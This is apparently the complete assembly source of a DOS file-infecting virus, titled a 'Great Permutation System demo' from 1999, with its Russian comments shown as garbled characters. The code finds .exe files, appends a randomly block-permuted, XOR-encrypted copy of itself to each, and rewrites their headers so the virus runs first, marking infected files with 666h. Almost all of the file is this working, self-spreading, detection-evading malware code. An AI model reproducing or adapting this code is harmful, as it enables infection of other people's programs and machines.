.386
assume cs:Xseg,ss:Sseg
Xseg segment use16                      ;�� 类�� ��ࠦ����� �ணࠬ��
                        mov ah,9
                        lea dx,Mess1
                        push cs
                        pop ds
                        int 21h
                        mov ax,4c00h
                        int 21h

Mess1:                  db 'Welcome to hell!$'
Xseg ends
;--------------------------- ��砫� ���� ---------------------------------------
assume cs:Vseg
Vseg segment use16                      
;#CodeStart
Start:                  pusha

                        mov ax,ds
                        add cs:[Old_cs],ax ;����ࠨ���� ���祭��
                        add cs:[Old_ss],ax ;cs � ss

                        call VirMain ;#CALL
                                     ;��뢠�� �᭮���� ������

                        popa
                        cli
                        mov ss,cs:[Old_ss]
                        mov sp,cs:[Old_sp]
                        sti
                        jmp dword ptr cs:[Old_ip] ;#WARP
                                          ;������ � ��ࠦ����� �ணࠬ��

VirMain                 proc near ;#PROC
                        push ds
                        push es

                        mov ah,1ah
                        lea dx,[DTA]
                        push cs
                        push cs
                        pop ds
                        pop es
                        int 21h ;��⠭�������� DTA

                        call Randomize ;#CALL
                                ;���樠�����㥬 ������� ��砩��� �ᥫ

                        mov cx,offset Code2-offset XorKey
                        lea si,[XorKey]
                        mov al,ds:[si]
vm1:                    xor ds:[si],al ;����஢뢠�� ⠡���� � ��㣨�
                                       ;����室��� ��� ࠡ��� �����
                        inc si
                        loop vm1 ;#Jxx

                        mov ah,4eh
                        mov cx,63
                        lea dx,[Exe]
                        int 21h ;�饬 ���� exe-䠩�

vm2:                    jc vm3 ;#Jxx
                        call Infect ;#CALL
                                    ;�맮� ��楤��� ��ࠦ����
                        mov ah,4fh
                        int 21h ;�饬 ᫥���騩 exe-䠩�
                        jmp vm2 ;#JMP

vm3:                    pop es
                        pop ds
                        mov ah,1ah
                        mov dx,80h
                        int 21h ;����⠭�������� DTA
                                ;(�� ���祭�� PSP:80h)

                        ret ;#WARP
VirMain                 endp ;#PROC

Infect                  proc near ;#PROC
                                  ;��楤�� ��ࠦ����
                                  ;��� 䠩�� - � DTA
                        mov ax,3d02h
                        lea dx,[DTA+1eh]
                        int 21h ;���뢠�� 䠩�
                        jc in1 ;#Jxx
                        mov bx,ax

                        mov ah,3fh
                        mov cx,1ch
                        lea dx,[Header]
                        int 21h ;�⠥� exe-header

                        cmp word ptr ds:[Header],'ZM' ;�஢��塞 �ଠ� 䠩��
                        jne in2 ;#Jxx
                        cmp word ptr ds:[Header+12h],666h ;��⪠ ��ࠦ���� -
                                                          ;����஫쭠� �㬬�
                                                          ;ࠢ�� 666h
                        je in2 ;#Jxx
                        cmp word ptr ds:[Header+4],600 ;�஢��塞 ࠧ���
                                                       ;(�᫨ ����� 300k -
                                                       ;��室)
                        ja in2 ;#Jxx

                        mov ax,word ptr ds:[Header+0eh]
                        add ax,10h
                        mov ds:[Old_ss2],ax ;��࠭塞 ��砫쭮� ���祭�� ss
                        mov ax,word ptr ds:[Header+10h]
                        mov ds:[Old_sp2],ax ;��࠭塞 ��砫쭮� ���祭�� sp
                        mov ax,word ptr ds:[Header+14h]
                        mov ds:[Old_ip2],ax ;��࠭塞 ��砫쭮� ���祭�� ip
                        mov ax,word ptr ds:[Header+16h]
                        add ax,10h
                        mov ds:[Old_cs2],ax ;��࠭塞 ��砫쭮� ���祭�� cs

                        call CreateCopy ;#CALL
                                        ;��뢠�� ��楤��� ���樨,
                                        ;��� �����頥� � ax �����
                                        ;��砫쭮� ���祭�� ip
                        mov word ptr ds:[Header+14h],ax

                        mov ax,4202h
                        xor cx,cx
                        xor dx,dx
                        int 21h ;��६�頥� 䠩���� 㪠��⥫� � ����� 䠩��

                        add ax,15
                        adc dx,0
                        mov cx,16
                        div cx ;⥯��� � ax - ࠧ��� 䠩�� � ��ࠣ���
                        mov dx,ax
                        sub dx,word ptr ds:[Header+8] ;�⭨���� �����
                                                      ;���������
                        mov word ptr ds:[Header+16h],dx ;�����뢠�� �����
                                                        ;��砫쭮� ���祭�� cs

                        mul cx
                        mov cx,dx
                        mov dx,ax
                        mov ax,4200h
                        int 21h ;��ࠢ������ ����� 䠩�� �� �࠭��� ��ࠣ��

                        add ax,offset Code2-offset Start
                        adc dx,0 ;������塞 ����� �����
                                 ;⥯��� � dx:ax - ����� 䠩�� ��᫥ ��ࠦ����

                        push ax
                        push dx
                        add ax,511
                        adc dx,0
                        mov cx,512
                        div cx
                        mov word ptr ds:[Header+2],dx ;�����뢠�� ����� �᫮
                                                      ;���� � ��᫥����
                                                      ;ᥪ�� 䠩��
                        mov word ptr ds:[Header+4],ax ;�����뢠�� ����� 䠩��
                                                      ;� ᥪ���

                        pop dx
                        pop ax
                        add ax,offset DataEnd-offset Code2+15
                        adc dx,0 ;�ਡ���塞 � ����� ����� 䠩�� �����
                                 ;������ ������
                        mov cx,16
                        div cx
                        sub ax,word ptr ds:[Header+8]
                        mov word ptr ds:[Header+0eh],ax ;��⠭��������
                                                        ;ᥣ���� �⥪� -
                                                        ;�ࠧ� �� ��������
                                                        ;������
                        mov word ptr ds:[Header+10h],4096 ;sp=4096

                        mov word ptr ds:[Header+12h],666h ;�ਧ��� ��ࠦ����

                        mov ah,40h
                        mov cx,offset Code2-offset Start
                        lea dx,[Code2]
                        int 21h ;�����뢠�� ���

                        mov ax,4200h
                        xor cx,cx
                        xor dx,dx
                        int 21h ;��६�頥� 㪠��⥫� � ��砫� 䠩��

                        mov ah,40h
                        mov cx,1ch
                        lea dx,[Header]
                        int 21h ;�����뢠�� ��������� 䠩��

in2:                    mov ah,3eh
                        int 21h ;����뢠�� 䠩�

in1:                    ret ;#WARP
Infect                  endp ;#PROC

CreateCopy              proc near ;#PROC
                                  ;��楤�� ᮧ���� �� ����� Code2
                                  ;���஢����� ����� ���� � ᮮ⢥�����騥
                                  ;⠡����, � ax - ����� ᬥ饭�� entry point
                        push bx

                        mov cx,offset Code2-offset XorKey
                        lea si,[XorKey]
                        lea di,[XorKey2]
                        cld
                    rep movsb ;�����㥬 ⠡����, copyright � ��ப� '*.exe'

                        mov cx,N*2
cc1:                    mov ax,N
                        call Random ;#CALL
                        mov si,ax
                        shl si,1
                        add si,offset BlockPos2-offset Start
                        mov ax,N
                        call Random ;#CALL
                        mov di,ax
                        shl di,1
                        add di,offset BlockPos2-offset Start
                        push word ptr ds:[si]
                        push word ptr ds:[di]
                        pop word ptr ds:[si]
                        pop word ptr ds:[di] ;���塞 ���⠬� ��� �������
                                             ;⠡���� BlockOfs2 � ��砩�묨
                                             ;�����ᠬ� - ��������� 2N ࠧ
                        loop cc1 ;#Jxx

                        lea si,[BlockPos]
                        lea di,[BlockOfs]
                        call FindOffsets ;#CALL
                                         ;ᮧ���� ⠡���� ᬥ饭��
                                         ;��� �ਣ����쭮�� ��ਠ�� ����
                        lea si,[BlockPos2]
                        lea di,[BlockOfs2]
                        call FindOffsets ;#CALL
                                         ;ᮧ���� ⠡���� ᬥ饭��
                                         ;��� �����

                        xor bx,bx ;bx - ���稪 ����� �����
cc2:                    mov al,ds:[BlockSize+bx]
                        mov cl,al
                        shr al,6 ;al - �᫮ ����ࠨ������ ���ᮢ � �����
                        and cx,111111b ;cx - ����� �����
                        mov si,bx
                        shl si,1
                        mov di,ds:[BlockOfs2+si]
                        add di,offset Code2-offset Start ;di - ᬥ饭�� �����
                                                         ;� �����
                        mov si,ds:[BlockOfs+si] ;si - ᬥ饭�� ����� �
                                                ;��室��� ����
                    rep movsb ;�����㥬 ����

                        cmp al,0 ;al=0 - ��� ����ࠨ������ ���ᮢ
                        je cc3 ;#Jxx
                        cmp al,1 ;al=1 - 1 ����ࠨ����� ����
                        je cc4 ;#Jxx
                                        ;���� - 2 ����ࠨ������ ����

                        mov ax,ds:[si-5] ;� [si-5] - �⭮�⥫�� ����
                                         ;���室�
                        add ax,si
                        sub ax,3 ;�ਡ���塞 si-3 => � ax ��᮫��� ����
                                 ;�窨 �����祭�� � ��室��� ����
                        call FindTarget ;#CALL
                                 ;⥯��� � ax - ��᮫��� ���� �窨
                                 ;�����祭�� � ���஢��襩 �����
                        sub ax,di
                        add ax,3 ;�⭨���� di-3 � ����砥� �⭮�⥫��
                                 ;���� ���室�
                        mov ds:[di-5],ax ;��࠭塞 ���

cc4:                    mov ax,ds:[si-2] ;� [si-2] - �⭮�⥫�� ����
                                         ;���室�
                        add ax,si ;�ਡ���塞 si => � ax ��᮫��� ����
                                  ;�窨 �����祭�� � ��室��� ����
                        call FindTarget ;#CALL
                                  ;⥯��� � ax - ��᮫��� ���� �窨
                                  ;�����祭�� � ���஢��襩 �����
                        sub ax,di ;�⭨���� di � ����砥� �⭮�⥫��
                                  ;���� ���室�
                        mov ds:[di-2],ax ;��࠭塞 ���

cc3:                    inc bx ;���室�� � ᫥��饬� �����
                        cmp bx,N
                        jb cc2 ;#Jxx

                        mov bx,ds:[BlockOfs2] ;bx=BlockOfs2[0] -
                                              ;ᬥ饭�� �窨 �室�
cc5:                    mov ax,256
                        call Random ;#CALL
                                ;��室�� ��砩��� �᫮ ��� ��஢�� ⠡���
                        or ax,ax
                        jz cc5 ;#Jxx
                        mov cx,offset Code2-offset XorKey
                        lea si,[XorKey2]
cc6:                    xor ds:[si],al ;����஢뢠�� ⠡����
                        inc si
                        loop cc6 ;#Jxx
                        mov ax,bx ;ᬥ饭�� �窨 �室� - � ax

                        pop bx
                        ret ;#WARP
CreateCopy              endp ;#PROC

FindOffsets             proc near ;#PROC
                                ;��楤�� �������� ⠡���� ᬥ饭�� ������,
                                ;�� �室�: si 㪠�뢠�� �� ⠡���� ���浪�
                                ;�ᯮ������� ������, di - �� �������,
                                ;� ������ ���� ������� १����
                        mov cx,N
                        xor dx,dx ;dx - ���稪 ����� �����
fo1:                    xor bp,bp ;bp - ᬥ饭�� �����
                        xor bx,bx
                        push di
fo2:                    mov di,ds:[si+bx]
                        cmp di,dx ;�饬 � ��室��� ⠡��� ���� ����� dx
                        je fo3 ;#Jxx
                               ;�᫨ ��諨 - ��室 �� 横��
                        mov al,ds:[di+BlockSize]
                        and ax,111111b
                        add bp,ax ;�᫨ �� ��諨 - �ਡ���塞 � ᬥ饭��
                                  ;����� ��।���� �����
                        inc bx
                        inc bx
                        jmp fo2 ;#JMP
fo3:                    pop di
                        mov ax,bp
                        stosw ;��࠭塞 ᬥ饭��
                        inc dx ;���室�� � ᫥���饬� �����
                        loop fo1 ;#Jxx
                        ret ;#WARP
FindOffsets             endp ;#PROC

FindTarget              proc near ;#PROC
                                ;�� �室�: � ax - ��᮫�⭮� ᬥ饭��
                                ;�����ண� ����� � ��室��� ����,
                                ;�� ��室�: � ax - ��᮫�⭮� ᬥ饭��
                                ;⮣� �� ����� � ���஢��襬 ����
                        push bx
                        xor bx,bx ;bx - ���稪 ����� �����
ft1:                    cmp ds:[BlockOfs+bx],ax ;�饬 ����, ᬥ饭��
                                                ;���ண� ࠢ�� �室����
                                                ;���祭��
                        je ft2 ;#Jxx
                               ;�᫨ ��諨, � � bx ����� �����
                        inc bx
                        inc bx
                        jmp ft1 ;#JMP
ft2:                    mov ax,ds:[BlockOfs2+bx] ;��६ �� ⠡���� BlockOfs2
                                                 ;ᬥ饭�� �㦭��� �����
                                                 ;� ���஢��襬 ����
                        add ax,offset Code2-offset Start ;�ਡ���塞 ��砫쭮�
                                                         ;ᬥ饭�� �����
                        pop bx
                        ret ;#WARP
FindTarget              endp ;#PROC

                        ;����� ���� ������� �ᥢ����砩��� �ᥫ -
                        ;� ���騫 ��� �� ��࡮ ��᪠��, ⠪ �� ��
                        ;������ �� �����⬥ - � �ଥ Borland.
                        ;Randomize - ���樠������� �������,
                        ;Random - �� �室�: ax=Range
                        ;         �� ��室�: ax=��砩��� �᫮,
                        ;                    0<=ax<Range

Randomize               proc near ;#PROC
                        mov ah,2ch
                        int 21h
                        mov word ptr ds:[RandSeed],cx
                        mov word ptr ds:[RandSeed+2],dx
                        ret ;#WARP
Randomize               endp ;#PROC

Random                  proc near ;#PROC
                        push bx
                        push cx
                        push dx
                        push si
                        mov si,ax
                        mov ax,word ptr ds:[RandSeed]
                        mov bx,word ptr ds:[RandSeed+2]
                        mov cx,ax
                        mul ds:[RandMagic]
                        shl cx,3
                        add ch,cl
                        add dx,cx
                        add dx,bx
                        shl bx,2
                        add dx,bx
                        add dh,bl
                        shl bx,5
                        add dh,bl
                        add ax,1
                        adc dx,0
                        mov word ptr ds:[RandSeed],ax
                        mov word ptr ds:[RandSeed+2],dx
                        mov cx,dx
                        mul si
                        mov ax,cx
                        mov cx,dx
                        mul si
                        add ax,cx
                        adc dx,0
                        mov ax,dx
                        pop si
                        pop dx
                        pop cx
                        pop bx
                        ret ;#WARP
Random                  endp ;#PROC
;#CodeEnd

;----------------------- ����� ���� --------------------------------------------
Old_ip                  dw 0
Old_cs                  dw 10h
Old_sp                  dw 4096
Old_ss                  dw 10h
XorKey                  db 0 ;���� ��� ��஢�� ⠡���
ExData:                      ;� ���ࢠ�� �� ExData �� BlockPos
                             ;��������� �� �������⥫�� �����,
                             ;����� ������ ���� ��࠭��� � 䠩��
Exe                     db '*.exe',0
RandMagic               dw 8405h
Copyright               db 13,10
                        db ' Great Permutation System demo program'
                        db 13,10
                        db ' Copyright (C) 1999 by Tahorg'
                        db 13,10

N                       equ 110h        ;�᫮ ������ � ����         � 
BlockPos                dw N dup (?)    ;⠡��� �ᯮ������� ������ � 
BlockSize               db N dup (?)    ;⠡��� ���� ������         � 
					;� prc-䠩�� �� �।��騥 ��ப�
					;������ ���� �������� ��
					;ᮤ�ন��� tbl-䠩��
					;(����� ������� include gps.tbl)
;----------------------- ��砫� run-time ������ --------------------------------
Code2                   db (Old_ip-Start) dup (?) ;���� ��� ����� ����
Old_ip2                 dw (?)
Old_cs2                 dw (?)
Old_sp2                 dw (?)
Old_ss2                 dw (?)
XorKey2                 db (?)
Data2                   db (BlockPos-ExData) dup (?)
BlockPos2               dw N dup (?) ;���� ��� ����� ⠡���� 
				     ;�ᯮ������� ������
BlockSize2              db N dup (?) ;���� ��� ����� ⠡���� ���� ������
;----------------------- ��砫� ������, ����� �� ��࠭����� �� ��� ---------
BlockOfs                dw N dup (?) ;⠡��� ᬥ饭�� ������ ��室���� ����
BlockOfs2               dw N dup (?) ;⠡��� ᬥ饭�� ������ �����
Header                  db 1ch dup (?)
DTA                     db 43 dup (?)
RandSeed                dd (?)
DataEnd:
Vseg ends
;------------------------------------------------------------------------------
Sseg segment use16 stack
                        db 4096 dup (?)
Sseg ends
end Start
